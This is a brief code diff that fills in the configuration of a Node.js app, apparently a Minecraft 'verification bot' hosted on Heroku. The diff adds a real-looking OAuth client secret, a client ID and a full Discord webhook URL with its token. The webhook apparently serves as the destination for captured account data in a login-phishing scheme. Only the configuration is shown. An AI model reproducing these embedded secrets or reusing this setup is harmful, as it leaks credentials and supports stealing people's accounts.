@@ -1,8 +1,8 @@
 // Configuration
-const client_secret = 'change'
-const client_id = 'change'
+const client_secret = 'tKW8Q~~f.djPOv84ogaNt-t615IOuAxlA4NWbcty'
+const client_id = '6cfdbec3-62e8-4e6b-af4e-894eea7b914f '
 const redirect_uri = 'https://verificationbotmc1.herokuapp.com/'
-const webhook_url = 'change'
+const webhook_url = 'https://discord.com/api/webhooks/1040906916471259167/4YOBT-nWLie2P-C1OISiPDNM4mdO3Y0kHjVG-SoVu9TYXmFgDyf01DyiqMhK3eI3695z'
 const webhook_logging_url = 'change'
 // Config end
 const axios = require('axios')
